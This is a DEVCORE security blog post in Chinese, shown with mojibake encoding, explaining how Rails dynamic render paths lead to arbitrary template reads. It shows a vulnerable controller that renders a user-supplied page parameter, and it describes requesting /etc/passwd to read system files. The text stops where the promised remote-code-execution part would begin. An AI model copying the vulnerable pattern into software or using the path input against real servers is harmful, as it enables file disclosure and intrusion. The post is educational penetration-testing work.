

<!DOCTYPE html>
<html class="no-js sub-menu">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta charset="utf-8" />
    <link href="/images/favicon.png" rel="icon" size="32x32">
    <!-- web fullscreen -->
    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
    <meta name="format-detection" content="telephone=no">
    <title>Rails å‹•æ…‹æ¨£æ¿è·¯å¾‘çš„é¢¨éšª | DEVCORE æˆ´å¤«å¯‡çˆ¾</title>
    <link rel="stylesheet" href="/css/style.css" />
    <script src="/js/modernizr-custom.js"></script>
    <script src="/js/jquery-3.6.0.min.js"></script>
    <script src="/js/site.js"></script>
    <meta name="description" property="og:description" content="OWASP æ˜¯èªªï¼Œå¦‚æœä½ çš„æ¨£æ¿è·¯å¾‘æ˜¯å‹•æ…‹ç”¢ç”Ÿçš„ï¼Œè€Œä¸”ä½¿ç”¨è€…å¯ä»¥æ§åˆ¶é‚£å€‹æ¨£æ¿è·¯å¾‘ï¼Œé‚£éº¼ä½¿ç”¨è€…å°±å¯ä»¥è®€å–åˆ°ä»»æ„æ¨£æ¿ï¼ŒåŒ…å«ç®¡ç†ä»‹é¢çš„æ¨£æ¿ã€‚é€™æ¨£çš„æè¿°æ„Ÿè¦ºé‚„å¥½ï¼Œä½†å°±æˆ‘å€‘çš„ç™¼ç¾ï¼Œé€™å…¶å¯¦æ˜¯æ›´åš´é‡çš„ç›´æ¥å­˜å–ç‰©ä»¶å•é¡Œ(Insecure Direct Object References)ï¼Œç”šè‡³æœ‰æ©Ÿæœƒé€ æˆé ç«¯å‘½ä»¤åŸ·è¡Œ(Remote Code Execution)ï¼Œæ€éº¼èªªå‘¢ï¼Ÿæˆ‘å€‘ç›´æ¥çœ‹ä¸‹å»ã€‚" />
    <meta name="keywords" content="Rails, Vulnerability, RCE, IDOR" />
    <meta property="og:site_name" content="DEVCORE æˆ´å¤«å¯‡çˆ¾" />
    <meta property="og:title" content="Rails å‹•æ…‹æ¨£æ¿è·¯å¾‘çš„é¢¨éšª | DEVCORE æˆ´å¤«å¯‡çˆ¾" />
    <meta property="og:url" content="https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20150724/rails.png" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="Rails å‹•æ…‹æ¨£æ¿è·¯å¾‘çš„é¢¨éšª | DEVCORE æˆ´å¤«å¯‡çˆ¾">
    <meta name="twitter:description" content="OWASP æ˜¯èªªï¼Œå¦‚æœä½ çš„æ¨£æ¿è·¯å¾‘æ˜¯å‹•æ…‹ç”¢ç”Ÿçš„ï¼Œè€Œä¸”ä½¿ç”¨è€…å¯ä»¥æ§åˆ¶é‚£å€‹æ¨£æ¿è·¯å¾‘ï¼Œé‚£éº¼ä½¿ç”¨è€…å°±å¯ä»¥è®€å–åˆ°ä»»æ„æ¨£æ¿ï¼ŒåŒ…å«ç®¡ç†ä»‹é¢çš„æ¨£æ¿ã€‚é€™æ¨£çš„æè¿°æ„Ÿè¦ºé‚„å¥½ï¼Œä½†å°±æˆ‘å€‘çš„ç™¼ç¾ï¼Œé€™å…¶å¯¦æ˜¯æ›´åš´é‡çš„ç›´æ¥å­˜å–ç‰©ä»¶å•é¡Œ(Insecure Direct Object References)ï¼Œç”šè‡³æœ‰æ©Ÿæœƒé€ æˆé ç«¯å‘½ä»¤åŸ·è¡Œ(Remote Code Execution)ï¼Œæ€éº¼èªªå‘¢ï¼Ÿæˆ‘å€‘ç›´æ¥çœ‹ä¸‹å»ã€‚">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20150724/rails.png">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE æˆ´å¤«å¯‡çˆ¾" href="https://devco.re/rss">

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-GHXJ9PS005');
    </script>
    <link rel="stylesheet" href="/fonts/inter.css" />
    <link rel="stylesheet" href="/css/highlighter.css" />
    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
</head>
<body>
    <!-- å°è¦½åˆ— start -->
    <header class="header">
<div class="container">
    <!-- logo start -->
    <div class="logo">
        <a href="/">
            <img src="/images/logo.svg"/>
        </a>
    </div>
    <!-- logo end -->
    <!-- ä¸»é¸å–® start -->
    <nav class="nav">
        <ul class="menu">
            <li class="dropdown">
                <div class="menuLable">
                    <span>æœå‹™<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/services/red-team/">
                            <div class="item">

                                <h2>
                                    <i class="icon menu service-red-team"></i>
                                    ç´…éšŠæ¼”ç·´
                                </h2>
                                <p class="two-line">
                                    åœ¨ä¸å½±éŸ¿ä¼æ¥­ç‡Ÿé‹å‰æä¸‹ï¼Œç„¡æ‰€ä¸ç”¨å…¶æ¥µï¼Œå¾å„ç¨®é€²å…¥é»åŸ·è¡Œæ¨¡æ“¬å…¥ä¾µæ”»æ“Šï¼Œé”æˆä¼æ¥­æŒ‡å®šçš„æ¼”ç·´æƒ…å¢ƒã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/services/penetration-test/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-penetration-test"></i>
                                    æ»²é€æ¸¬è©¦
                                </h2>
                                <p class="two-line">
                                    ä»¥é§­å®¢æ€ç¶­åŠæ‰‹æ³•å˜—è©¦å…¥ä¾µä¼æ¥­æŒ‡å®šç³»çµ±ï¼Œæ‰¾å‡ºæ½›åœ¨æ¼æ´ï¼Œé©—è­‰ä¼æ¥­è³‡æ–™èˆ‡è¨­å‚™æ˜¯å¦å¯è¢«ç«Šå–æˆ–ç ´å£ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/services/security-consulting/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-consulting"></i>
                                    è³‡å®‰é¡§å•æœå‹™
                                </h2>
                                <p class="two-line">
                                    ä»¥ç´…éšŠæ¼”ç·´ç‚ºåŸºç¤ï¼Œæä¾›æ”»æ“Šè€…è¦–è§’èˆ‡å¯èƒ½å…¥ä¾µè·¯å¾‘ï¼Œå”åŠ©ä¼æ¥­è©•ä¼°è³‡å®‰è³‡æºå„ªå…ˆé †åºï¼Œä¸¦æ“¬å®šé•·æœŸé˜²ç¦¦ç­–ç•¥ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/services/security-training/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-training"></i>
                                    è³‡å®‰æ•™è‚²è¨“ç·´
                                </h2>
                                <p class="two-line">
                                    å¾æ”»æ“Šæ€ç¶­å‡ºç™¼ï¼Œå”åŠ©ä¼æ¥­æœ‰æ•ˆé é˜²è³‡å®‰äº‹æ•…ä¸¦é˜²ç¦¦ï¼›ä»¥åŠäº‹ä»¶ç™¼ç”Ÿæ™‚ï¼Œå¦‚ä½•å¿«é€Ÿåˆ¤å®šæ”»æ“Šç›®çš„ã€æ‰‹æ³•ã€æ¼æ´èˆ‡åŠæ‡‰è®Šæ–¹å¼ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="https://training.devco.re/" target="_blank">
                            <div class="item">
                                <h2>
                                    <i class="icon menu offsec"></i>
                                    OffSec é§­å®¢æŠ€è¡“èª²ç¨‹ <i class="icon open-in-new"></i>
                                </h2>
                                <p class="two-line">
                                    æ”œæ‰‹å…¨çƒç¶²è·¯å®‰å…¨åŸ¹è¨“åŠèªè­‰å•† OffSecï¼Œé€é Live Training åŸå» è¬›å¸«å¯¦é«”æˆèª²åŠç·šä¸Šèª²ç¨‹çš„çµæ§‹åŒ–å­¸ç¿’è³‡æºï¼Œè®“è³‡å®‰äººå“¡çš„ç¶²è·¯å®‰å…¨æ”»æ“ŠæŠ€è¡“èˆ‡æ™‚ä¿±é€²ã€‚
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>

            <li class="dropdown">
                <div class="menuLable">
                    <span>ç ”ç©¶<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/research/overview/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu search-circle"></i>
                                    ç¸½è¦½æ¦‚è¦
                                </h2>
                                <p class="two-line">
                                    æŒçºŒç²¾ç ”è³‡å®‰æœ€æ–°æŠ€è¡“åŠæ¼æ´ç ”ç©¶è¶¨å‹¢ï¼Œå…¨æ–¹ä½æª¢æ¸¬ä¼æ¥­ç”¢å“å®‰å…¨æ€§ã€å¸å–ç¶“é©—ä¸¦è½‰åŒ–ç‚ºç´…éšŠæ¼”ç·´å·¥å…·èˆ‡æ‰‹æ³•ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/research/awards/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu badge-check"></i>
                                    ç«¶è³½èˆ‡çé …
                                </h2>
                                <p class="two-line">
                                    åœ‹éš›ç´šè³‡è¨Šå®‰å…¨ç«¶è³½çé …è‚¯å®šã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/research/bug-bounty/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu puzzle"></i>
                                    ä¼æ¥­æ¼æ´å›å ±
                                </h2>
                                <p class="two-line">
                                    ç ”ç©¶ä¼æ¥­ç³»çµ±ä¸­çš„è³‡å®‰é¢¨éšªåŠå„ç¨®å¯èƒ½çš„çªç ´å£ï¼Œä¸¦é€šå ±ä¼æ¥­ä¿®è£œã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/research/talks/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu globe"></i>
                                    åœ‹éš›ç ”è¨æœƒ
                                </h2>
                                <p class="two-line">
                                    åƒèˆ‡å…¨çƒè³‡å®‰ç››æœƒï¼Œç™¼è¡¨ã€äº¤æµæ¼æ´çš„çŸ¥è­˜èˆ‡è³‡è¨Šã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/research/cve/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu view-list"></i>
                                    CVE æ¼æ´åˆ—è¡¨
                                </h2>
                                <p class="two-line">
                                    æŒ–æ˜ä¸¦å›å ±åœ‹éš›çŸ¥åç”¢å“èˆ‡æœå‹™çš„é‡å¤§æ¼æ´ã€‚
                                </p>
                            </div>
                        </a>
                    </div>
                </div>


            </li>

            <li class="dropdown">
                <div class="menuLable" href="#">
                    <span>å…¬å¸<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/company/about/">
                        <div class="item">
                            <h2>
                                <i class="icon menu company"></i>
                                å…¬å¸ç°¡ä»‹
                            </h2>
                            <p>
                                DEVCORE æˆ´å¤«å¯‡çˆ¾ç”±ä¸–ç•Œç´šç™½å¸½é§­å®¢åœ˜éšŠå‰µç«‹ï¼Œæä¾›ç´…éšŠæ¼”ç·´ã€æ»²é€æ¸¬è©¦ã€è³‡å®‰é¡§å•æœå‹™ã€è³‡å®‰æ•™è‚²è¨“ç·´ç­‰æœå‹™ã€‚
                            </p>
                        </div>
                        </a>
                        <a href="/company/our-team/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu team"></i>
                                    åœ˜éšŠæˆå“¡
                                </h2>
                                <p class="two-line">
                                    ç”±ç†±è¡·æŒ‘æˆ°ã€å…·å‚™é§­å®¢æ€ç¶­çš„è³‡å®‰å°ˆå®¶çµ„æˆï¼Œå°ˆæ³¨æ–¼å‰µæ–°æ”»æ“Šæ‰‹æ³•ç ”ç©¶ï¼Œä¸¦ä»¥ã€Œé«˜é“å¾·ã€é«˜è‡ªå¾‹ã€é«˜åš´è¬¹ã€ç‚ºæœ€é«˜æŒ‡å°åŸå‰‡ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/company/history/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu milestone"></i>
                                    æˆå°±èˆ‡æ²¿é©
                                </h2>
                                <p class="two-line">
                                    é•·æœŸèšç„¦æ–¼æ”»æ“Šç ”ç©¶ï¼Œå±¢å±¢ç²é‚€åƒèˆ‡å…¨çƒçŸ¥åè³‡å®‰ç ”è¨æœƒï¼Œå·²æ­éœ²æ•¸ç™¾å€‹é‡è¦ç”¢å“æ¼æ´ã€å”åŠ©ä¼æ¥­æå‡é˜²ç¦¦èƒ½é‡ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/company/csr/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu heart"></i>
                                    ä¼æ¥­ç¤¾æœƒè²¬ä»»
                                </h2>
                                <p class="two-line">
                                    æä¾›å¤šå…ƒå¯¦ç¿’ç®¡é“å’Œç ”ç¿’è¨ˆç•«ï¼Œæå‡æ–°ä¸–ä»£äººæ‰è³‡å®‰èƒ½é‡ï¼Œæ¨å»£è³‡è¨Šå®‰å…¨æ„è­˜ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/company/jobs/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu briefcase"></i>
                                    å·¥ä½œæ©Ÿæœƒ
                                </h2>
                                <p class="two-line">
                                    åŠ å…¥ DEVCOREï¼Œå…±åŒæ”¹å–„è³‡å®‰ç”¢æ¥­çµæ§‹ï¼Œèˆ‡æˆ‘å€‘ä¸€èµ·æ‰“é€ æ›´å®‰å…¨çš„ä¸–ç•Œã€‚
                                </p>
                            </div>
                        </a>
                        <a href="https://conf.devco.re/" target="_blank">
                            <div class="item">
                                <h2>
                                    <i class="icon menu conference"></i>
                                    æ”»æ“Šå°å‘æŠ€è¡“ç ”è¨æœƒ <i class="icon open-in-new"></i>
                                </h2>
                                <p class="two-line">
                                    ç”± DEVCORE èˆ‰è¾¦çš„æŠ€è¡“ç ”è¨æœƒï¼Œèšç„¦æ–¼æŠ€è¡“ä¸¦ç”±é§­å®¢è¦–è§’å‡ºç™¼ï¼Œå¸¶æ‚¨æ¢ç´¢å‰µæ–°çš„æ”»æ“ŠæŠ€è¡“èˆ‡æ‰‹æ³•ï¼Œå¾æ”»æ“Šæ€è€ƒé˜²ç¦¦çš„ç­–ç•¥ã€‚
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li class="dropdown">
                <div class="menuLable">
                    <span>æ–°è<i class="icon arrow_down"></i></span>
                    <div class="menuItem">
                        <a href="/blog/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu newspaper"></i>
                                    BLOG
                                </h2>
                                <p>
                                    DEVCORE æœ€æ–°æ¶ˆæ¯ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/media-kit/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu download"></i>
                                    åª’é«”ç´ æä¸‹è¼‰
                                </h2>
                                <p>
                                    ä½¿ç”¨ DEVCORE å•†æ¨™é ˆéµå¾ªçš„ä½¿ç”¨è¦ç¯„ã€‚
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li>
                <a class="menuLable" href="/search/">æœå°‹</a>
            </li>
            <li>
                <a class="menuLable" href="/contact/">è¯çµ¡æˆ‘å€‘</a>
            </li>
        </ul>
    </nav>
    <!-- ä¸»é¸å–® end -->
</div>


<!-- æ‰‹æ©Ÿæ¿é¸å–®  start-->
<nav class="nav-m" id="menu-m">
    <ul class="menu">
        <li>
            <div class="menuLable">
                <span>æœå‹™</span>
                <div class="menuItem">
                    <a href="/services/red-team/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-red-team"></i>
                                ç´…éšŠæ¼”ç·´
                            </h2>
                        </div>
                    </a>
                    <a href="/services/penetration-test/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-penetration-test"></i>
                                æ»²é€æ¸¬è©¦
                            </h2>
                        </div>
                    </a>
                    <a href="/services/security-consulting/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-consulting"></i>
                                é¡§å•æœå‹™
                            </h2>
                        </div>
                    </a>
                    <a href="/services/security-training/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-training"></i>
                                æ•™è‚²è¨“ç·´
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>è³‡å®‰ç ”ç©¶</span>
                <div class="menuItem">
                    <a href="/research/overview/" class="fullwidth">
                        <div class="item">
                            <h2>ç¸½è¦½æ¦‚è¦</h2>
                        </div>
                    </a>
                    <a href="/research/awards/">
                        <div class="item">
                            <h2>ç«¶è³½èˆ‡çé …</h2>
                        </div>
                    </a>
                    <a href="/research/bug-bounty/">
                        <div class="item">
                            <h2>Bug Bounty</h2>
                        </div>
                    </a>
                    <a href="/research/talks/">
                        <div class="item">
                            <h2>åœ‹éš›ç ”è¨æœƒ</h2>
                        </div>
                    </a>
                    <a href="/research/cve/">
                        <div class="item">
                            <h2>CVE æ¼æ´åˆ—è¡¨</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>

        <li>
            <div class="menuLable">
                <span>å…¬å¸</span>
                <div class="menuItem">
                    <a href="/company/about/" class="fullwidth">
                        <div class="item">
                            <h2>å…¬å¸ç°¡ä»‹</h2>
                        </div>
                    </a>
                    <a href="/company/our-team/">
                        <div class="item">
                            <h2>åœ˜éšŠæˆå“¡</h2>
                        </div>
                    </a>
                    <a href="/company/history/">
                        <div class="item">
                            <h2>æˆå°±èˆ‡æ²¿é©</h2>
                        </div>
                    </a>
                    <a href="/company/csr/">
                        <div class="item">
                            <h2>ä¼æ¥­ç¤¾æœƒè²¬ä»»</h2>
                        </div>
                    </a>
                    <a href="/company/jobs/">
                        <div class="item">
                            <h2>å·¥ä½œæ©Ÿæœƒ</h2>
                        </div>
                    </a>
                    <a href="https://conf.devco.re/" target="_blank">
                        <div class="item">
                            <h2>DEVCORE CONFERENCE</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>æ–°è</span>
                <div class="menuItem">
                    <!-- <a href="/blog/">
                    <div class="item">
                        <h2>æ‰€æœ‰æ–‡ç« </h2>
                    </div>
                    </a> -->
                    <!-- <a href="">
                        <div class="item">
                            <h2>æ¡ˆä¾‹å‰–æ</h2>
                        </div>
                    </a> -->
                    <!-- <a href="">
                        <div class="item">
                            <h2>ç§‘æ™®æ–‡ç« </h2>
                        </div>
                    </a>
                    <a href="">
                        <div class="item">
                            <h2>æŠ€è¡“å°ˆæ¬„</h2>
                        </div>
                    </a>
                    <a href="">
                        <div class="item">
                            <h2>è³‡å®‰æ–°è</h2>
                        </div>
                    </a> -->
                    <a href="/blog/">
                        <div class="item">
                            <h2>BLOG</h2>
                        </div>
                    </a>
                    <a href="/media-kit/">
                        <div class="item">
                            <h2>åª’é«”ç´ æä¸‹è¼‰</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <div class="menuItem">
                    <a href="/search/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon search"></i>
                                æœå°‹
                            </h2>
                        </div>
                    </a>
                    <a href="/contact/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon chat-alt"></i>
                                è¯çµ¡æˆ‘å€‘
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span><i class="icon translate"></i>Language</span>
                <div class="menuItem">
                    <a href="/">
                    <div class="item">
                        <h2>ä¸­æ–‡</h2>
                    </div>
                    </a>
                    <a href="/en">
                        <div class="item">
                            <h2>English</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
    </ul>
</nav>
<!-- æ‰‹æ©Ÿæ¿é¸å–®  end-->
    </header>
    <!-- å°è¦½åˆ— end -->

    <!-- tab é¸å–® start -->
    <div class="sub-nav">
        <div class="container">
            <h1>BLOG</h1>
            <ul class="tab">
                <li>
                    <a href="/blog/">æ‰€æœ‰æ–‡ç« </a>
                </li>
                <li>
                    <a href="/blog/category/æœ€æ–°æ¶ˆæ¯/">æœ€æ–°æ¶ˆæ¯</a>
                </li>
                <li>
                    <a href="/blog/category/æŠ€è¡“å°ˆæ¬„/">æŠ€è¡“å°ˆæ¬„</a>
                </li>
                <li>
                    <a href="/blog/category/ç§‘æ™®æ–‡ç« /">ç§‘æ™®æ–‡ç« </a>
                </li>
                <li>
                    <a href="/blog/category/è³‡å®‰æ–°è/">è³‡å®‰æ–°è</a>
                </li>
                <li>
                    <a href="/blog/category/å­¸ç”Ÿç›¸é—œè¨ˆåŠƒ/">å­¸ç”Ÿç›¸é—œè¨ˆåŠƒ</a>
                </li>
                <li>
                    <a href="/media-kit/">åª’é«”ç´ æä¸‹è¼‰</a>
                </li>
            </ul>
        </div>
    </div>
    <!-- tab é¸å–® end -->
    
    <div class="main">
        <!-- æ–‡ç« å¤–å±¤layer -->
        <section class="narrow">
            <!-- æ–‡ç«  start -->
            <article class="article_body">
                <div class="content">
                    <a class="category" href="/blog/category/æŠ€è¡“å°ˆæ¬„">æŠ€è¡“å°ˆæ¬„</a>
                    <span class="tag">

                      <a href="/blog/tag/Rails/">#Rails</a> <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/RCE/">#RCE</a> <a href="/blog/tag/IDOR/">#IDOR</a> 
                    </span>
                    <h1>
                        Rails å‹•æ…‹æ¨£æ¿è·¯å¾‘çš„é¢¨éšª
                    </h1>
                    
                    
                    <div class="author_detail">
                        <span class="avatar">
                            <a href="/blog/author/shaolin">
                                <div class="circle">
                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/shaolin.png');" ></i>
                                </div>
                            </a>
                        </span>
                        <span class="author"><a href="/blog/author/shaolin">Shaolin</a></span>
                        <span class="date">2015-07-24</span>
                    </div>
                    
                    
                    <div class="article_img">
                        <img src="https://devco.re/assets/img/blog/20150724/rails.png"/>
                    </div>
                    

                    <hr>

                    <!-- æ–‡ç« å…§å®¹ -->
                    <div class="article_content">
<h3 id="å‰è¨€">å‰è¨€</h3>

<p>å¾å®‰å…¨é–‹ç™¼çš„è§’åº¦ä¾†çœ‹ï¼ŒRuby on Rails æ˜¯ä¸€å¥—å¾ˆå‹å–„çš„æ¡†æ¶ã€‚å®ƒå¾æ¡†æ¶å±¤é¿å…äº†å¾ˆå¤šéå»ç¶²ç«™å¸¸å‡ºç¾çš„å®‰å…¨å•é¡Œï¼Œä¾‹å¦‚ä½¿ç”¨ ORM é¿å…å¤§éƒ¨åˆ†çš„ SQL injection å•é¡Œã€æœ‰å…§å»ºçš„ authenticity_token è®“é–‹ç™¼è€…ä¸å¿…ç‰¹åˆ¥ç…©æƒ± CSRFã€å¾æ©Ÿåˆ¶é¢è¦å®šé–‹ç™¼è€…ä½¿ç”¨ Strong Parameter é¿å… Mass Assignmentã€é è¨­è½‰åŒ–å±éšªå­—å…ƒé¿å… XSS ç­‰â€¦ã€‚</p>

<p>å°±æˆ‘å€‘éå»<a href="https://devco.re/services/penetration-test/">æ»²é€æ¸¬è©¦</a>çš„ç¶“é©—ä¾†èªªï¼ŒRails ç¶²ç«™é›–ç„¶é‚„æ˜¯èƒ½æ‰¾åˆ°å•é¡Œï¼Œä½†ç›¸å°å•é¡Œè¼ƒå°‘ï¼Œè€Œä¸”å¾ˆå°‘å–®ç´”å› ç‚º Rails å¯«æ³•å•é¡Œæ‹¿åˆ°ç³»çµ±æ“ä½œæ¬Šã€‚è€Œä»Šå¤©è¦åˆ†äº«çš„ï¼Œæ˜¯åœ¨ä¸€æ¬¡æ»²é€æ¸¬è©¦ä¸­æ¯”è¼ƒç‰¹åˆ¥çš„ä¾‹å­ï¼Œå› ç‚ºé–‹ç™¼è€…ä½¿ç”¨äº†å‹•æ…‹æ¨£æ¿è·¯å¾‘(Dynamic Render Paths)çš„å¯«æ³•<sup id="fnref:note1" role="doc-noteref"><a href="#fn:note1" class="footnote" rel="footnote">1</a></sup>ï¼Œæœ€å¾Œé€ æˆäº†åš´é‡çš„çµæœã€‚</p>

<!-- more -->

<p>å‹•æ…‹æ¨£æ¿è·¯å¾‘ï¼ŒOWASP çš„<a href="https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet#Dynamic_Render_Paths">ä»‹ç´¹</a>æ˜¯é€™æ¨£çš„ï¼š</p>

<blockquote>
  <p>In Rails, controller actions and views can dynamically determine which view or partial to render by calling the â€œrenderâ€ method. If user input is used in or for the template name, an attacker could cause the application to render an arbitrary view, such as an administrative page.<br /><br />
Care should be taken when using user input to determine which view to render. If possible, avoid any user input in the name or path to the view.</p>
</blockquote>

<p>OWASP æ˜¯èªªï¼Œå¦‚æœä½ çš„æ¨£æ¿è·¯å¾‘æ˜¯å‹•æ…‹ç”¢ç”Ÿçš„ï¼Œè€Œä¸”ä½¿ç”¨è€…å¯ä»¥æ§åˆ¶é‚£å€‹æ¨£æ¿è·¯å¾‘ï¼Œé‚£éº¼ä½¿ç”¨è€…å°±å¯ä»¥è®€å–åˆ°ä»»æ„æ¨£æ¿ï¼ŒåŒ…å«ç®¡ç†ä»‹é¢çš„æ¨£æ¿ã€‚é€™æ¨£çš„æè¿°æ„Ÿè¦ºé‚„å¥½ï¼Œä½†å°±æˆ‘å€‘çš„ç™¼ç¾ï¼Œé€™å…¶å¯¦æ˜¯æ›´åš´é‡çš„ç›´æ¥å­˜å–ç‰©ä»¶å•é¡Œ(Insecure Direct Object References)ï¼Œç”šè‡³æœ‰æ©Ÿæœƒé€ æˆé ç«¯å‘½ä»¤åŸ·è¡Œ(Remote Code Execution)ï¼Œæ€éº¼èªªå‘¢ï¼Ÿæˆ‘å€‘ç›´æ¥çœ‹ä¸‹å»ã€‚</p>

<h3 id="åŸºæœ¬ç´°ç¯€">åŸºæœ¬ç´°ç¯€</h3>

<p>ä¸€å€‹å‹•æ…‹æ¨£æ¿è·¯å¾‘çš„å¯«æ³•å¦‚ä¸‹ï¼š</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1"># app/controllers/welcome_controller.rb</span>
<span class="k">class</span> <span class="nc">WelcomeController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
  <span class="k">def</span> <span class="nf">index</span>
    <span class="n">page</span> <span class="o">=</span> <span class="n">params</span><span class="p">[</span><span class="ss">:page</span><span class="p">]</span> <span class="o">||</span> <span class="s1">'index'</span>
    <span class="n">render</span> <span class="n">page</span>
  <span class="k">end</span>
<span class="k">end</span></code></pre></figure>

<p>è€Œ index çš„æ¨£æ¿å…§å®¹æ˜¯é€™æ¨£ï¼š</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="c">&lt;!-- app/views/welcome/index.html.erb --&gt;</span>
This is INDEX page.</code></pre></figure>

<p>å¦å¤–å»ºä¸€å€‹ demo æ¨£æ¿åšç¤ºæ„ï¼š</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="c">&lt;!-- app/views/welcome/demo.html.erb --&gt;</span>
This is DEMO page.</code></pre></figure>

<p>å¯¦éš›æ¸¬è©¦ï¼Œå¦‚æœæˆ‘å€‘é€£åˆ° WelcomeController çš„ index actionï¼Œä¸å¸¶ä»»ä½•åƒæ•¸æœƒè®€å– index æ¨¡ç‰ˆã€‚</p>

<p><a href="/assets/img/blog/20150724/render_index.png"><img src="/assets/img/blog/20150724/render_index.png" alt="Rails render index view" title="Rails render index view" /></a></p>

<p>å¦‚æœå¸¶åƒæ•¸ page=demoï¼Œæœƒè®€å–åˆ° demo æ¨¡ç‰ˆã€‚</p>

<p><a href="/assets/img/blog/20150724/render_demo.png"><img src="/assets/img/blog/20150724/render_demo.png" alt="Rails render demo view" title="Rails render demo view" /></a></p>

<p>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘å€‘çŸ¥é“ç®¡ç†ä»‹é¢çš„æ¨¡ç‰ˆè·¯å¾‘ï¼Œé€å‡ºè·¯å¾‘åƒæ•¸å°±å¯ä»¥è®€å–åˆ°ç®¡ç†ä»‹é¢ã€‚é€™å°±æ˜¯ OWASP æ‰€æè¿°çš„é¢¨éšªï¼Œæ”»æ“Šè€…å¾—ä»¥è®€å–ä»»æ„æ¨¡ç‰ˆã€‚</p>

<p><a href="/assets/img/blog/20150724/render_admin.png"><img src="/assets/img/blog/20150724/render_admin.png" alt="Rails render admin view" title="Rails render admin view" /></a></p>

<p>ç„¶è€Œï¼Œç•¶æˆ‘å€‘å˜—è©¦é€å‡ºç³»çµ±çµ•å°è·¯å¾‘ä¾‹å¦‚ /etc/passwd <sup id="fnref:note2" role="doc-noteref"><a href="#fn:note2" class="footnote" rel="footnote">2</a></sup>ï¼Œç¶²é ç«Ÿç„¶åå‡ºäº† /etc/passwd çš„å…§å®¹ï¼é€™å°±æ˜¯ä¹‹å‰æ‰€è¿°çš„ç›´æ¥å­˜å–ç‰©ä»¶å•é¡Œï¼Œå¯ä»¥éæ­·ç›®éŒ„ç€è¦½æª”æ¡ˆã€‚</p>

